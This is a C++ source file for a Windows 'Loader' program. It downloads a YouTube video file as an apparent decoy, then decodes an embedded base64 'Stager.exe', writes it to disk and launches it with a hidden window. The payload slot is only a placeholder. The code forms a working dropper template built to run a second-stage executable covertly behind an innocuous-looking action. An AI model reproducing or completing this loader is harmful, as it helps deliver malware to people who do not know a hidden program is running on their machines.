// x86_64-w64-mingw32-g++ Loader.cpp -o Loader.exe -municode -static -s \
    -lwinhttp -lcrypt32 -lshell32 -lshlwapi
    
#include <windows.h>
#include <winhttp.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "shell32.lib")

std::string wstr_to_utf8(const std::wstring& wstr) {
    if (wstr.empty()) return {};
    int size = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string str(size - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &str[0], size, nullptr, nullptr);
    return str;
}

bool download_file(const std::wstring& url, const std::wstring& filename) {
    std::wcout << L"Started downloading -> " << filename << L'\n';
    HINTERNET session = WinHttpOpen(L"Downloader/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                    WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!session) return false;

    URL_COMPONENTS urlComp = { sizeof(urlComp) };
    wchar_t host[256] = {}, path[2048] = {};
    urlComp.lpszHostName = host; urlComp.dwHostNameLength = _countof(host);
    urlComp.lpszUrlPath  = path; urlComp.dwUrlPathLength  = _countof(path);

    if (!WinHttpCrackUrl(url.c_str(), 0, 0, &urlComp)) {
        WinHttpCloseHandle(session);
        return false;
    }

    HINTERNET connect = WinHttpConnect(session, host, urlComp.nPort, 0);
    if (!connect) { WinHttpCloseHandle(session); return false; }

    DWORD flags = (urlComp.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET request = WinHttpOpenRequest(connect, L"GET", path, nullptr,
                                           WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!request) { WinHttpCloseHandle(connect); WinHttpCloseHandle(session); return false; }

    if (!WinHttpSendRequest(request, nullptr, 0, nullptr, 0, 0, 0) ||
        !WinHttpReceiveResponse(request, nullptr)) {
        WinHttpCloseHandle(request); WinHttpCloseHandle(connect); WinHttpCloseHandle(session);
        return false;
    }

    std::ofstream file(wstr_to_utf8(filename), std::ios::binary);
    if (!file.is_open()) {
        WinHttpCloseHandle(request); WinHttpCloseHandle(connect); WinHttpCloseHandle(session);
        return false;
    }

    std::vector<char> buffer(8192);
    DWORD bytesRead;
    while (WinHttpReadData(request, buffer.data(), buffer.size(), &bytesRead) && bytesRead > 0)
        file.write(buffer.data(), bytesRead);

    file.close();
    WinHttpCloseHandle(request);
    WinHttpCloseHandle(connect);
    WinHttpCloseHandle(session);
    return true;
}

bool run_embedded_exe() {
    const std::string base64_data = R"(
 put the Stager.exe base64 string here
    )";

    std::string clean_b64;
    for (char c : base64_data)
        if (!isspace(c)) clean_b64 += c;

    DWORD size = 0;
    if (!CryptStringToBinaryA(clean_b64.c_str(), 0, CRYPT_STRING_BASE64, nullptr, &size, nullptr, nullptr))
        return false;

    std::vector<BYTE> exe_data(size);
    if (!CryptStringToBinaryA(clean_b64.c_str(), 0, CRYPT_STRING_BASE64, exe_data.data(), &size, nullptr, nullptr))
        return false;
    exe_data.resize(size);

    std::wcout << L"Successfully read -> Stager.exe\n";

    WCHAR exe_path[MAX_PATH];
    GetModuleFileNameW(nullptr, exe_path, MAX_PATH);              
    PathRemoveFileSpecW(exe_path);                                 
    wcscat_s(exe_path, L"\\Stager.exe");                           

    std::ofstream file(wstr_to_utf8(exe_path), std::ios::binary);
    if (!file.is_open()) return false;
    file.write(reinterpret_cast<const char*>(exe_data.data()), exe_data.size());
    file.close();

    SHELLEXECUTEINFOW info = { sizeof(info) };
    info.lpVerb = L"open";
    info.lpFile = exe_path;
    info.nShow  = SW_HIDE;
    info.fMask  = SEE_MASK_NOCLOSEPROCESS;

    if (ShellExecuteExW(&info)) {
        WaitForSingleObject(info.hProcess, INFINITE);
        CloseHandle(info.hProcess);

        std::wcout << L"Successfully opened -> Final_Result.exe\n";
        return true;
    }

    DeleteFileW(exe_path);
    return false;
}

int wmain() {
    const std::wstring url    = L"https://rr1---sn-uxaxjvhxbt2u-5aty.googlevideo.com/videoplayback?expire=1763582759&ei=x84daeagLvWZhcIPktXbqQ4&ip=154.184.125.171&id=o-AF9TPIQdwLkiiqul_xsDxAfh92OIc6tFdHySWHZ3nAFV&itag=137&source=youtube&requiressl=yes&xpc=EgVo2aDSNQ%3D%3D&cps=12&met=1763561159%2C&mh=DX&mm=31%2C29&mn=sn-uxaxjvhxbt2u-5aty%2Csn-hgn7rn7k&ms=au%2Crdu&mv=m&mvi=1&pl=15&rms=au%2Cau&initcwndbps=317500&bui=AdEuB5TsU9PNExUdj_b9bfgYxLk_IYW-ysNGRTGBD5UQOnX-PtTsRMLcTktOInO6OO321AeCm4HO26l-&spc=6b0G_Nvh-_I2rKaUeyG6lmO5RjgYwk6ZaQ-ypWxWqJ7_yuy82C3Ti8tB&vprv=1&svpuc=1&mime=video%2Fmp4&rqh=1&gir=yes&clen=1454012&dur=1.541&lmt=1763561120035836&mt=1763560940&fvip=2&keepalive=yes&fexp=51552689%2C51565115%2C51565682%2C51580968&c=ANDROID_VR&txp=6209224&sparams=expire%2Cei%2Cip%2Cid%2Citag%2Csource%2Crequiressl%2Cxpc%2Cbui%2Cspc%2Cvprv%2Csvpuc%2Cmime%2Crqh%2Cgir%2Cclen%2Cdur%2Clmt&sig=AJfQdSswRQIgGvn4BbD2astn6A_KgVtjJ80ei5zCCyqpF9Q5hGERtuQCIQDS_9_MGZ1vtarmkR3FRyuMAGZs2sUk7RC8a5udvxmRuw%3D%3D&lsparams=cps%2Cmet%2Cmh%2Cmm%2Cmn%2Cms%2Cmv%2Cmvi%2Cpl%2Crms%2Cinitcwndbps&lsig=APaTxxMwRgIhAN8I3gYtsYvLBLVNw9pf55OGNlrt3dDNQlHjRGurwG-dAiEA9Yu2ghHsQfMlm61EzfBF32ee8FJQRieFBpbhEAG-DAk%3D";
    const std::wstring output = L"Pixel_Code_Video.mp4";

    if (!download_file(url, output)) {
        std::wcerr << L"Download failed.\n";
    } else if (!run_embedded_exe()) {
        std::wcerr << L"Failed to run Stager.exe.\n";
    } else {
        std::wcout << L"Successfully opened -> Final_Result.exe\n";
    }

    return 0;
}